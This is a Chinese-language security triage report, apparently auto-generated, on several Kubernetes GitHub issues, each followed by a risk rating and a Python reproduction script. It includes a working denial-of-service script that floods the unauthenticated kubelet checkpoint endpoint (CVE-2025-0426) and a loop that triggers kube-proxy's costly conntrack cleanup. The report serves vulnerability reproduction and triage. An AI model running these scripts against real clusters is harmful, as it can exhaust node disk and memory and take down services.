# Issue 安全分析报告

# 🚨 存在高风险的 Issues (2 个)

## Issue #130016 CVE-2025-0426: Node Denial of Service via kubelet Checkpoint API

- Issue 链接：[#130016](https://github.com/kubernetes/kubernetes/issues/130016)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk. 

#### Am I vulnerable?

All clusters running an affected version listed below with the kubelet read-only HTTP port enabled and using a container runtime that supports the container checkpointing feature, such as CRI-O v1.25.0+ (with `enable_criu_support` set to true) or containerd v2.0+ with `criu` installed, are affected.

##### Affected Versions

- kubelet v1.32.0 to v1.32.1
- kubelet v1.31.0 to v1.31.5
- kubelet v1.30.0 to v1.30.9

#### How do I mitigate this vulnerability?

This issue can be mitigated by setting the `ContainerCheckpoint` feature gate to `false` in your kubelet configuration, disabling the kubelet read-only port, and limiting access to the kubelet API, or upgrading to a fixed version listed below, which enforces authentication for the kubelet Checkpoint API.

##### Fixed Versions

- kubelet master - fixed by #129739
- kubelet v1.32.2 - fixed by #130010
- kubelet v1.31.6 - fixed by #130011
- kubelet v1.30.10 - fixed by #130012
- kubelet v1.29.14 - fixed by #130014
  - Note: Container checkpoint support was an off by default Alpha feature in v1.25-v1.29

#### Detection

A large number of requests to the kubelet read-only HTTP server's `/checkpoint` endpoint, or a large number of checkpoints stored (by default) under `/var/lib/kubelet/checkpoints` on a Node may indicate an attempted Denial of Service attack using this bug.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported and fixed by Tim Allclair @tallclair from Google.

The issue was coordinated by: 

Tim Allclair @tallclair
Sascha Grunert saschagrunert@
Craig Ingram @cji
Jordan Liggitt liggitt@

/triage accepted
/lifecycle frozen
/area security
/kind bug
/committee security-response
/label official-cve-feed
/sig node
/area kubelet

### 分析结果

**风险定级：**  
高风险  
（依据 CVSS 3.1 短评：[CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H]，攻击者本地网络内即可发起 DoS 攻击，严重影响节点的可用性）

**判断依据：**  
该 issue 描述的是 Kubernetes 中 kubelet Checkpoint API 存在一个漏洞。攻击者可以向未认证的 kubelet 只读 HTTP 端点发送大量容器 checkpoint 请求，从而在 Node 上填满磁盘导致服务不可用（DoS）。该问题利用了 kubelet 在启用了 checkpoint 特性且未作身份验证的情况下接受大量请求的缺陷，依赖的条件是使用了支持 checkpoint 的 container runtime（例如 CRI-O 或 containerd），而且 kubelet 的只读端口开启。问题影响范围较大，且无需攻击者具有任何权限即可触发攻击，因此风险较高。

**复现过程：**

```python
import threading
import time
import requests
from kubernetes import client, config

# 设置全局变量，控制测试时长（单位秒）
TEST_DURATION = 120  # 超时2分钟
REQUEST_TIMEOUT = 5  # 单个请求超时（秒）
NUM_THREADS = 4      # 线程数量，可根据需要调整

# 用于线程间统计请求数
request_counter = 0
counter_lock = threading.Lock()

def load_nodes():
    """
    使用 Kubernetes Python client 加载 kubeconfig 并获取集群中的 NodeInternalIP。
    这里假设 kubeconfig 位于默认位置（如 ~/.kube/config）。
    """
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败: ", e)
        return []
    v1 = client.CoreV1Api()
    try:
        nodes = v1.list_node().items
    except Exception as e:
        print("获取节点列表失败: ", e)
        return []
    node_ips = []
    for node in nodes:
        for addr in node.status.addresses:
            if addr.type == "InternalIP":
                node_ips.append(addr.address)
                break
    return node_ips

def send_requests(target_url, stop_time):
    """
    不断向目标 URL 发送 GET 请求直到达到停止时间
    """
    global request_counter
    while time.time() < stop_time:
        try:
            # 发送 GET 请求到 /checkpoint 接口
            r = requests.get(target_url, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                with counter_lock:
                    request_counter += 1
            else:
                # 返回非200也记录请求
                with counter_lock:
                    request_counter += 1
        except Exception as e:
            # 请求超时或失败时也继续尝试
            pass

def main():
    nodes = load_nodes()
    if not nodes:
        print("未能获取到 Kubernetes 节点信息，请确保 kubeconfig 正确且集群可访问。")
        return

    # 针对每个节点构造 kubelet 只读 HTTP 端口地址（默认端口 10255）
    # 这里假设受影响的节点开启了只读端口
    endpoints = []
    for ip in nodes:
        endpoint_url = f"http://{ip}:10255/checkpoint"
        endpoints.append(endpoint_url)
    print("检测到以下 kubelet Checkpoint API 终端地址:")
    for url in endpoints:
        print("  ", url)

    # 选择第一个节点作为复现目标进行 DoS 攻击测试
    target = endpoints[0]
    print(f"开始针对 {target} 模拟大量请求以复现 DoS 漏洞，测试时长 {TEST_DURATION} 秒...")

    stop_time = time.time() + TEST_DURATION
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=send_requests, args=(target, stop_time))
        threads.append(t)
        t.start()

    # 等待所有线程结束
    for t in threads:
        t.join(timeout=TEST_DURATION + 10)

    print(f"测试结束，共尝试发送请求 {request_counter} 次。")
    print("请检查目标节点的磁盘使用情况，看是否由于大量 checkpoint 请求导致磁盘空间异常增长。")

# 直接执行 main 函数
main()
```


---


## Issue #129982 Excessive conntrack cleanup causes high memory (12GB) and CPU usage when any Pod with a UDP port changes

- Issue 链接：[#129982](https://github.com/kubernetes/kubernetes/issues/129982)

### Issue 内容

#### What happened?

We are encountering a severe performance issue in kube-proxy (v1.32) when any Pod with a UDP port is updated (e.g., CoreDNS). In the new kube-proxy implementation, changes to Services or Pods that expose UDP ports trigger a full conntrack cleanup. This cleanup process iterates over the entire conntrack table, leading to extremely high resource consumption—sometimes up to 12 GB of memory and 1.5 CPU cores per kube-proxy instance.

In a simple test, we observed 2,780 instances of the log message "Adding conntrack filter for cleanup", which caused an OOM when kube-proxy was limited to 256 MB of memory. Without that limit, kube-proxy memory usage spiked to 12 GB. On nodes with large conntrack tables, kube-proxy effectively becomes stuck, consuming all available memory each time there is a UDP endpoint change.

This issue appears to be systemic; every change in a Pod with a UDP port triggers all kube-proxy instances to perform the extensive cleanup. Currently, there is no option to disable or throttle this behavior, which disrupts cluster stability and can lead to service degradation or outages. We request that the cleanup logic be revised to target only the relevant conntrack entries or that a mechanism be provided to disable or limit this aggressive cleanup behavior.


https://github.com/kubernetes/kubernetes/pull/127318
https://github.com/kubernetes/kubernetes/issues/126130

#### What did you expect to happen?

We expected kube-proxy to handle conntrack cleanup in a more efficient and targeted way. Even if it needs to scan a significant portion of the conntrack table, it should do so without causing a spike to 12 GB of memory usage. Ideally, it would either:

- Limit its cleanup to entries relevant to the specific changed UDP endpoint.
- Provide a way to configure or disable this aggressive cleanup process so it does not risk out-of-memory (OOM) events or excessively high CPU usage.

#### How can we reproduce it (as minimally and precisely as possible)?

- Deploy multiple Pods that generate a high volume of DNS requests, for example:
- A simple Golang application making repeated DNS lookups without any caching mechanism.
- Observe kube-proxy resource usage (memory and CPU) on that node.
- Delete or update the coredns Pod (which also uses UDP DNS).
- Watch the logs and resource usage of kube-proxy closely, noting the surge in memory (potentially up to 12 GB) and CPU usage as it performs the conntrack cleanup.

#### Anything else we need to know?

![Image](https://github.com/user-attachments/assets/f75f0bc0-e394-45fa-b323-2f6fc0570386)

<img width="1708" alt="Image" src="https://github.com/user-attachments/assets/a4ff03e2-156c-4b60-bf87-7caf53859e51" />

<img width="1679" alt="Image" src="https://github.com/user-attachments/assets/81b4bea7-5cf6-498e-9cd4-ec807f267912" />

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.32.0-eks-5ca49cb
```

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux: Amazon Linux 2
5.10.230-223.885.amzn2.aarch64

```

</details>


#### Install tools

<details>
EKS
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd://1.7.23
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
kube-proxy:v1.32.0-minimal-eksbuild.2
</details>


### 分析结果

**风险定级：**  
根据描述，该问题属于拒绝服务（DoS）风险，并且攻击者不一定需要高权限即可执行（在多租户场景下普通用户可能有创建更新 Pod 的权限），因此使用 CVSS 3.1 标准打分后可评为高风险。

**判断依据：**  
该 issue 描述的是 kube-proxy 在检测到任何带 UDP 端口的 Pod 发生变更时，会触发全局的 conntrack 清理，导致清理过程遍历整个 conntrack 表，从而引发极高的内存和 CPU 占用，严重时甚至会使 kube-proxy 发生内存溢出和节点宕机。该问题本身不涉及密码、敏感信息泄露或不当配置，但其影响在于可能被恶意用户利用产生拒绝服务（DoS）的效果。特别是在多租户集群中，只需具备创建或更新 Pod 的权限（通常普通用户均有权限创建或更新自己的 Pod）即可复现该行为，从而对集群稳定性造成影响。

**复现过程：**

```python
import threading
import time
import traceback
from datetime import datetime, timezone

from kubernetes import client, config
from kubernetes.client.rest import ApiException

# 设置整个脚本的执行最大时间为2分钟
EXECUTION_TIMEOUT = 120  # 秒
NAMESPACE = "poc-dos-test"
POD_NAME = "udp-pod-dos"

def create_namespace(v1):
    ns = client.V1Namespace(
        metadata=client.V1ObjectMeta(name=NAMESPACE)
    )
    try:
        v1.create_namespace(ns)
        print(f"Namespace {NAMESPACE} 创建成功")
    except ApiException as e:
        if e.status == 409:
            print(f"Namespace {NAMESPACE} 已存在")
        else:
            print("创建 Namespace 失败：", e)
            raise

def create_udp_pod(v1):
    # 创建一个带有 UDP 端口定义的 Pod，使用 busybox 作为示例镜像，持续 sleep 3600 秒
    container = client.V1Container(
        name="udp-container",
        image="busybox",
        command=["sh", "-c", "sleep 3600"],
        ports=[client.V1ContainerPort(container_port=53, protocol="UDP")]
    )
    pod_spec = client.V1PodSpec(containers=[container])
    pod_metadata = client.V1ObjectMeta(
        name=POD_NAME,
        labels={"app": "udp-test"}
    )
    pod = client.V1Pod(
        metadata=pod_metadata,
        spec=pod_spec
    )
    try:
        v1.create_namespaced_pod(namespace=NAMESPACE, body=pod)
        print(f"Pod {POD_NAME} 创建成功")
    except ApiException as e:
        print("创建 Pod 失败：", e)
        raise

def wait_for_pod_running(v1, timeout=60):
    print("等待 Pod 进入 Running 状态...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            pod = v1.read_namespaced_pod(name=POD_NAME, namespace=NAMESPACE)
            if pod.status.phase == "Running":
                print("Pod 已处于 Running 状态")
                return True
        except ApiException:
            pass
        time.sleep(2)
    raise TimeoutError("Pod 未在规定时间内进入 Running 状态")

def patch_pod_annotation(v1):
    now_str = datetime.now(timezone.utc).isoformat()
    patch_body = {
        "metadata": {
            "annotations": {
                "updatedAt": now_str
            }
        }
    }
    try:
        v1.patch_namespaced_pod(name=POD_NAME, namespace=NAMESPACE, body=patch_body)
        print(f"Pod 进行了更新，updatedAt: {now_str}")
    except ApiException as e:
        print("更新 Pod 失败：", e)

def delete_namespace(v1):
    try:
        v1.delete_namespace(name=NAMESPACE)
        print(f"Namespace {NAMESPACE} 删除中...")
    except ApiException as e:
        print("删除 Namespace 失败：", e)

def main():
    try:
        # 加载默认的 kubeconfig
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败，请确保文件在默认位置", e)
        return

    v1 = client.CoreV1Api()

    try:
        create_namespace(v1)
        create_udp_pod(v1)
        wait_for_pod_running(v1)
    except Exception:
        traceback.print_exc()
        return

    # 开始进行 Pod 更新操作，每次更新会改变 Pod 的 annotations，模拟UDP Pod更新事件，从而触发 kube-proxy 的全局 conntrack cleanup
    start_time = time.time()
    try:
        while time.time() - start_time < EXECUTION_TIMEOUT:
            patch_pod_annotation(v1)
            # 每 5 秒进行一次更新，适当调节更新频率
            time.sleep(5)
    except Exception:
        traceback.print_exc()
    finally:
        try:
            delete_namespace(v1)
        except Exception:
            traceback.print_exc()
        print("复现脚本执行完毕。")

# 直接调用 main 函数
main()
```


**解释说明：**

1. 脚本首先加载默认位置的 kubeconfig，通过 python 的 kubernetes 客户端操作集群。
2. 创建新的命名空间（poc-dos-test），以防止对现有命名空间造成干扰。
3. 在该命名空间中创建一个名为 udp-pod-dos 的 Pod，此 Pod 使用 busybox 镜像并指定了 UDP 端口（例如 53 端口）。
4. 脚本等待 Pod 进入 Running 状态后，进入主循环。在主循环中，每隔 5 秒通过 patch 操作更新 Pod 的 annotation，从而模拟 Pod 更新事件。根据 issue 的描述，每次此事件都会触发 kube-proxy 对整个 conntrack 表进行清理，从而可能带来高内存和 CPU 消耗。
5. 整个操作在 2 分钟内执行完毕，避免脚本陷入死循环。最后清理创建的命名空间，确保不会对集群留下残留资源。
6. 此复现脚本仅用于研究和本地测试，务必在非生产环境中验证！

---


# ⚠️ 存在低风险的 Issues (3 个)

## Issue #130036 SELinux controller does not work when KCM runs in a container

- Issue 链接：[#130036](https://github.com/kubernetes/kubernetes/issues/130036)

### Issue 内容

#### What happened?

When KCM runs in a container (such as in a kops cluster), the SELinuxWarning controller does not do anything, because it thinks that SELinux is disabled - it reads /etc/selinux and /sys/fs/selinux to detect so here:
https://github.com/kubernetes/kubernetes/blob/20b12ad5c389ff74792988bf1e0c10fe2820d9a1/pkg/volume/util/selinux.go#L109

As result, it does not emit useful warnings.

#### What did you expect to happen?

The controller emits events, regardless if it can access /etc or /sys on the host. The controller must be explicitly enabled, so it can expect that someone who enabled it also enabled SELinux on nodes.

#### How can we reproduce it (as minimally and precisely as possible)?

Run KCM with `--controllers=*,selinux-warning-controller --feature-gates=SELinuxChangePolicy=true,SELinuxMount=true` and create 2 pods that use the same volume, but each Pod has different `seLinuxOptions`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
Today's master
```console
v1.33.0-alpha.0.569+834719d46dabe1-dirty
```
</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>
```console
PRETTY_NAME="Fedora Linux 41 (Cloud Edition)"
```
</details>


#### Install tools

<details>
kops
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
N/A
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### 分析结果

**风险定级：**  
低风险  
说明：该问题本身不直接导致远程攻击、权限提升或命令执行等严重安全漏洞，而只是削弱了对 SELinux 异常的检测和告警功能，从而可能在部署中埋下配置风险。根据 CVSS 3.1 评分标准，这类问题暂时可评为低风险。

**判断依据：**  
该 Issue 描述的是在容器中运行的 Kubernetes Controller Manager（KCM）中的 SELinuxWarning controller 未能正常工作的问题。主要原因在于 controller 通过读取容器内的 /etc/selinux 和 /sys/fs/selinux 文件来判断 SELinux 状态，当 KCM 以容器方式运行时，这两个路径并不能反映主机的 SELinux 状态，导致错误地认为 SELinux 被禁用，从而不发出预期的警告事件。此问题可能导致管理员忽略实际节点上 SELinux 未开启或配置错误的情况，从而使得安全加固状态不明，虽然本质上只是告警功能失效，但可能会间接降低监控和审计的安全能力。

**复现过程：**

```python
#!/usr/bin/env python3
import time
import threading
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def create_pvc(api, namespace, pvc_name):
    pvc = client.V1PersistentVolumeClaim(
        metadata=client.V1ObjectMeta(name=pvc_name),
        spec=client.V1PersistentVolumeClaimSpec(
            access_modes=["ReadWriteOnce"],
            resources=client.V1ResourceRequirements(
                requests={"storage": "1Gi"}
            )
        )
    )
    try:
        api.create_namespaced_persistent_volume_claim(namespace=namespace, body=pvc)
        print(f"PVC {pvc_name} 创建成功")
    except ApiException as e:
        if e.status == 409:
            print(f"PVC {pvc_name} 已存在，继续")
        else:
            print("创建PVC失败: %s\n" % e)
            raise

def create_pod(api, namespace, pod_name, pvc_name, se_linux_options):
    # 构造容器SecurityContext
    container_security_context = client.V1SecurityContext(
        se_linux_options=client.V1SELinuxOptions(
            user=se_linux_options.get("user"),
            role=se_linux_options.get("role"),
            type=se_linux_options.get("type"),
            level=se_linux_options.get("level")
        )
    )
    # 构造容器
    container = client.V1Container(
        name="busybox",
        image="busybox",
        command=["sleep", "3600"],
        security_context=container_security_context,
        volume_mounts=[client.V1VolumeMount(
            mount_path="/mnt/data",
            name="shared-data"
        )]
    )
    pod_spec = client.V1PodSpec(
        containers=[container],
        volumes=[client.V1Volume(
            name="shared-data",
            persistent_volume_claim=client.V1PersistentVolumeClaimVolumeSource(
                claim_name=pvc_name
            )
        )],
        restart_policy="Never"
    )
    pod = client.V1Pod(
        metadata=client.V1ObjectMeta(name=pod_name),
        spec=pod_spec
    )
    try:
        api.create_namespaced_pod(namespace=namespace, body=pod)
        print(f"Pod {pod_name} 创建成功")
    except ApiException as e:
        print("创建Pod失败: %s\n" % e)
        raise

def delete_resource(api, namespace, name, kind="pod"):
    try:
        if kind == "pod":
            api.delete_namespaced_pod(name, namespace, client.V1DeleteOptions())
            print(f"Pod {name} 删除成功")
        elif kind == "pvc":
            api.delete_namespaced_persistent_volume_claim(name, namespace, client.V1DeleteOptions())
            print(f"PVC {name} 删除成功")
    except ApiException as e:
        print(f"删除 {kind} {name} 失败: {e}")

def run_reproduce():
    # 载入默认的kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载kubeconfig失败: ", e)
        return

    core_v1_api = client.CoreV1Api()
    namespace = "default"
    pvc_name = "selinux-test-pvc"
    pod1_name = "selinux-test-pod-1"
    pod2_name = "selinux-test-pod-2"

    # 创建PVC
    create_pvc(core_v1_api, namespace, pvc_name)

    # 定义两个Pod不同的seLinuxOptions参数
    se_linux_options_1 = {"user": "system_u", "role": "system_r", "type": "spc_t", "level": "s0"}
    se_linux_options_2 = {"user": "unconfined_u", "role": "object_r", "type": "s0:c123,c456", "level": "s0"}

    # 分别创建两个Pod，这两个Pod挂载同一个PVC但seLinuxOptions不一致
    create_pod(core_v1_api, namespace, pod1_name, pvc_name, se_linux_options_1)
    create_pod(core_v1_api, namespace, pod2_name, pvc_name, se_linux_options_2)

    # 等待一段时间以便观察Pod状态和事件（默认等待30秒）
    timeout = 60  # 设置超时时间为60秒，确保脚本在2分钟内结束
    print("等待中，请在集群中观察KCM是否产生相关的SELinux告警事件...")
    time.sleep(timeout)

    # 清理资源
    delete_resource(core_v1_api, namespace, pod1_name, kind="pod")
    delete_resource(core_v1_api, namespace, pod2_name, kind="pod")
    delete_resource(core_v1_api, namespace, pvc_name, kind="pvc")
    print("复现测试结束，资源已清理。")

def timeout_exit():
    # 超时退出机制，确保脚本不会运行超过120秒
    time.sleep(120)
    print("执行超时，退出程序")
    import sys
    sys.exit(1)

def main():
    # 启动超时线程，确保在2分钟内退出
    t = threading.Thread(target=timeout_exit)
    t.daemon = True
    t.start()
    run_reproduce()

main()
```


---


## Issue #129979 CRD conversion webhooks should not be called for unused apiVersions

- Issue 链接：[#129979](https://github.com/kubernetes/kubernetes/issues/129979)

### Issue 内容

#### What happened?

We have CRDs with multiple apiVersions. Even if the old (non-storage) apiVersions are not used at all we regularly receive conversion requests for them.

We roughly get 1 conversion request for each non-storage apiVersion per kube-apiserver instance for every CR create/update (actually a little bit less than that, but not sure why).

So if we have a CRD with 5 old apiVersions and a cluster with 3 kube-apiservers

=> we get roughly 15 conversion requests for every create/update on a CR (it's slightly less than that - not sure why though)



#### What did you expect to happen?

I would expect to only get conversion requests when conversion is required, e.g. if a client requests a CR in a different apiVersion than the one in which the object is stored in etcd.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a Kubernetes cluster via kind
```
kind create cluster
```

Deploy the Cluster CRD
```
$ kubectl apply -f ./crd_cluster.yaml
```

<details>

<summary>crd_cluster.yaml</summary>

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  annotations:
    controller-gen.kubebuilder.io/version: v0.17.0
  name: clusters.cluster.x-k8s.io
spec:
  conversion:
    strategy: Webhook
    webhook:
      conversionReviewVersions: ["v1", "v1beta1"]
      clientConfig:
        service:
          namespace: system
          name: webhook-service
          path: /convert
  group: cluster.x-k8s.io
  names:
    kind: Cluster
    listKind: ClusterList
    plural: clusters
    singular: cluster
  scope: Namespaced
  versions:
  - deprecated: true
    name: v1alpha3
    schema:
      openAPIV3Schema:
        properties:
          spec:
            properties:
              paused:
                type: boolean
            type: object
        type: object
    served: false
    storage: false
  - deprecated: true
    name: v1alpha4
    schema:
      openAPIV3Schema:
        properties:
          spec:
            properties:
              paused:
                type: boolean
            type: object
        type: object
    served: true
    storage: false
  - name: v1beta1
    schema:
      openAPIV3Schema:
        properties:
          spec:
            properties:
              paused:
                type: boolean
            type: object
        type: object
    served: true
    storage: true
```

</details>

Deploy the Cluster CR
```
$ kubectl apply -f ./cr_cluster.yaml
```

<details>

<summary>cr_cluster.yaml</summary>

```yaml
kind: Cluster
apiVersion: cluster.x-k8s.io/v1beta1
metadata:
  name: cluster-1
  namespace: default
```

</details>

Observe kube-apiserver logs

```
$ kubectl -n kube-system logs -f kube-apiserver-kind-control-plane
...
E0204 13:21:54.207206       1 watcher.go:567] failed to prepare current and previous objects: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found
...

E0204 13:30:47.583960       1 cacher.go:478] cacher (clusters.cluster.x-k8s.io): unexpected ListAndWatch error: failed to list cluster.x-k8s.io/v1alpha4, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found; reinitializing...
W0204 13:30:48.586795       1 reflector.go:569] storage/cacher.go:/cluster.x-k8s.io/clusters: failed to list cluster.x-k8s.io/v1alpha4, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found
...
E0204 13:30:45.575802       1 cacher.go:478] cacher (clusters.cluster.x-k8s.io): unexpected ListAndWatch error: failed to list cluster.x-k8s.io/v1alpha3, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found; reinitializing...
W0204 13:30:46.579452       1 reflector.go:569] storage/cacher.go:/cluster.x-k8s.io/clusters: failed to list cluster.x-k8s.io/v1alpha3, Kind=Cluster: conversion webhook for cluster.x-k8s.io/v1beta1, Kind=Cluster failed: Post "https://webhook-service.system.svc:443/convert?timeout=30s": service "webhook-service" not found
```

Some comments:
* First we deploy a CRD with the following apiVersions:
  * v1alpha3: served: false, storage: false
  * v1alpha4: served: true, storage: false
  * v1beta1: served: true, storage: true
* Then we deploy a v1beta1 Cluster CR
* We can then see in the apiserver logs that the apiserver tries to create a ListWatch for v1alpha3 & v1alpha4
  * This simple example to reproduce the issue doesn't implement an actual conversion webhook, so we simply get errors.
  * If we would implement a conversion webhook the ListWatch would be created successfully and we could observe conversion requests for v1alpha3 / v1alpha4 (as mentioned above roughly for every single create/update of a Cluster CR)
* As not a single CR has been read or written with v1alpha3 or v1alpha4 I would have expected to receive no conversion requests at all. Instead we see a very high number of conversion requests. This problem multiplies with the number of kube-apiserver's.

#### Anything else we need to know?

We opened a Slack thread for this issue and did some initial triage: https://kubernetes.slack.com/archives/C0EG7JC6T/p1736528576393239

While debugging through the apiserver we found the following:
* A GET request to one of our APIs leads to a call of [https://github.com/kubernetes/kubernetes/blob/439d2f7b4028638b3d8d9261bb046c3ba8d9[…]apiextensions-apiserver/pkg/apiserver/customresource_handler.go](https://github.com/kubernetes/kubernetes/blob/439d2f7b4028638b3d8d9261bb046c3ba8d9bfcb/staging/src/k8s.io/apiextensions-apiserver/pkg/apiserver/customresource_handler.go#L611)
* `getOrCreateServingInfoFor` then iterates through all versions of our CRD and calls customresource.NewStorage for them
* Then a few layers deeper reflectors are created for all versions

So if we understand this correctly the apiserver creates reflectors (with list & watch) for all versions of all CRDs (also independent of if the versions are served or not):
![Image](https://github.com/user-attachments/assets/cff93477-913e-4811-aeca-de7dadbe0a43)

We think these reflectors are then later calling the conversion webhooks:
![Image](https://github.com/user-attachments/assets/36dc7888-95c3-4e2e-89e8-471f2668090a)


@sttts opened a PR with the goal to stop creating ListWatches for unserved versions: https://github.com/kubernetes/kubernetes/pull/129709


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.0
Kustomize Version: v5.5.0
Server Version: v1.32.0
```

</details>


#### Cloud provider

<details>
-
</details>


#### OS version

<details>

Apple Silicon M2

</details>


#### Install tools

<details>
-
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
-
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
-
</details>


### 分析结果

**风险定级：**  
低风险  
（原因：虽然问题可能在特定情况下诱发拒绝服务（DoS），但需要一定权限才能发起 CR 创建/更新操作，且本质上属于性能/资源消耗问题，不涉及直接的安全权限提升或代码执行风险。）

**判断依据：**  
该 issue 描述的是 Kubernetes CRD 在使用 conversion webhook 时，不恰当地对所有 apiVersions（即使未提供存储或未被使用的版本）都调用转换 webhook，从而导致大量不必要的转换请求。问题本身是一个逻辑错误或者说是性能问题，会引起 apiserver 和 webhook 服务承受额外负载，甚至可能导致拒绝服务（DoS）的后果。但由于触发该行为需要用户创建或更新 CR（普通操作需要额外权限），因此并非可由任意网络攻击者远程利用的漏洞，也不会直接导致执行任意代码、容器逃逸等高风险安全问题。

**复现过程：**

```python
import threading
import json
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import traceback

from kubernetes import client, config, utils
from kubernetes.client.rest import ApiException

# 定义一个简单的转换 webhook HTTP 处理器
class ConversionWebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            if self.path == "/convert":
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                print("收到转换请求, body:", post_data.decode("utf-8"))
                # 返回一个简单的转换响应，此响应仅用于复现 webhook 被调用的现象
                # 按照 Kubernetes conversion webhook 的规范，返回 conversionReview 对象
                response_data = {
                    "apiVersion": "apiextensions.k8s.io/v1",
                    "kind": "ConversionReview",
                    "result": {
                        "convertedObjects": [],
                        "result": {"status": "Success"},
                    }
                }
                resp = json.dumps(response_data).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(resp)))
                self.end_headers()
                self.wfile.write(resp)
            else:
                self.send_error(404)
        except Exception:
            self.send_error(500)
            traceback.print_exc()

    def log_message(self, format, *args):
        # 重写默认日志，不打印到stderr
        return

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

def start_webhook_server(server_port):
    server_address = ('', server_port)
    httpd = ThreadingHTTPServer(server_address, ConversionWebhookHandler)
    print(f"启动转换 webhook HTTP 服务器, 监听端口 {server_port}")
    httpd.serve_forever()

def create_crd(apiext_api):
    crd_manifest = {
        "apiVersion": "apiextensions.k8s.io/v1",
        "kind": "CustomResourceDefinition",
        "metadata": {
            "name": "clusters.cluster.x-k8s.io"
        },
        "spec": {
            "group": "cluster.x-k8s.io",
            "versions": [
                {
                    "name": "v1alpha3",
                    "served": False,
                    "storage": False,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "paused": {"type": "boolean"}
                                    }
                                }
                            }
                        }
                    }
                },
                {
                    "name": "v1alpha4",
                    "served": True,
                    "storage": False,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "paused": {"type": "boolean"}
                                    }
                                }
                            }
                        }
                    }
                },
                {
                    "name": "v1beta1",
                    "served": True,
                    "storage": True,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "paused": {"type": "boolean"}
                                    }
                                }
                            }
                        }
                    }
                }
            ],
            "scope": "Namespaced",
            "names": {
                "plural": "clusters",
                "singular": "cluster",
                "kind": "Cluster",
                "listKind": "ClusterList"
            },
            "conversion": {
                "strategy": "Webhook",
                # 使用 clientConfig 中的 url 指向本地启动的 webhook HTTP 服务
                "webhook": {
                    "conversionReviewVersions": ["v1", "v1beta1"],
                    "clientConfig": {
                        "url": "http://localhost:10000/convert"
                    }
                }
            }
        }
    }
    try:
        apiext_api.create_custom_resource_definition(crd_manifest)
        print("CRD 创建成功")
    except ApiException as e:
        if e.status == 409:
            print("CRD 已经存在")
        else:
            print("创建 CRD 时发生错误:", e)
            raise

def wait_for_crd_established(apiext_api, name, timeout=60):
    print("等待 CRD 注册完成...")
    end_time = time.time() + timeout
    while time.time() < end_time:
        try:
            crd = apiext_api.read_custom_resource_definition(name)
            for cond in crd.status.conditions:
                if cond.type == "Established" and cond.status == "True":
                    print("CRD 已建立")
                    return True
        except Exception:
            pass
        time.sleep(2)
    print("等待 CRD 建立超时")
    return False

def create_cluster_cr(custom_api):
    # 使用 v1beta1 apiVersion 创建 CR
    cluster_manifest = {
        "apiVersion": "cluster.x-k8s.io/v1beta1",
        "kind": "Cluster",
        "metadata": {
            "name": "cluster-1",
            "namespace": "default"
        },
        "spec": {
            "paused": False
        }
    }
    try:
        custom_api.create_namespaced_custom_object(
            group="cluster.x-k8s.io",
            version="v1beta1",
            namespace="default",
            plural="clusters",
            body=cluster_manifest
        )
        print("Cluster CR 创建成功")
    except ApiException as e:
        if e.status == 409:
            print("Cluster CR 已存在")
        else:
            print("创建 Cluster CR 时发生错误:", e)
            raise

def update_cluster_cr(custom_api):
    # 简单地更新 CR 的 spec, 以触发可能的 conversion 请求
    patch = {"spec": {"paused": True}}
    try:
        custom_api.patch_namespaced_custom_object(
            group="cluster.x-k8s.io",
            version="v1beta1",
            namespace="default",
